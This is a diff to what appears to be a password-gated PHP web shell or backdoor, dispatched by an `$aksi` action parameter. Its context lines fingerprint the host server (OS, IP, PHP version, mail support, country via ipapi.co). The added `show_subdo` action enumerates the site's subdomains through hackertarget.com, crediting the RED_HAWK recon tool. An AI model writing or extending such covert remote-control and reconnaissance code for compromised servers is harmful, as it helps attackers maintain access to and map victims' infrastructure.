@@ -258,7 +258,6 @@ if($password === $get_password)
         $os = php_uname();
         $ip = getHostByName(getHostName());
         $ver = phpversion();
-        $web = $_SERVER['HTTP_HOST'];
         $sof = $_SERVER['SERVER_SOFTWARE'];
         $mail = (function_exists('mail')) ? "ON" : "OFF";
         $county_name = file_get_contents("https://ipapi.co/".$ip."/country_name");
@@ -309,6 +308,29 @@ if($password === $get_password)
         else
         {
             echo "False";
+        }
+    }
+    else if($aksi == "show_subdo")
+    {
+        header('Content-Type: text/plain');
+
+        $web = $_SERVER['HTTP_HOST'];
+        $web = str_replace('www.','',$web);
+        
+        // count and scan subdomain by RED_HAWK
+        $urlsd      = "http://api.hackertarget.com/hostsearch/?q=" . $web;
+        $resultsd   = file_get_contents($urlsd);
+        $subdomains = trim($resultsd, "\n");
+        $subdomains = explode("\n", $subdomains);
+        unset($subdomains['0']);
+        $sdcount = count($subdomains);
+
+        echo "[i] Total Subdomains Found : ". $sdcount . "\n\n";
+
+        foreach ($subdomains as $subdomain)
+        {
+          echo "[+] Subdomain: " . (str_replace(",", "\n[-] IP: ", $subdomain));
+          echo "\n\n";
         }
     }
     else
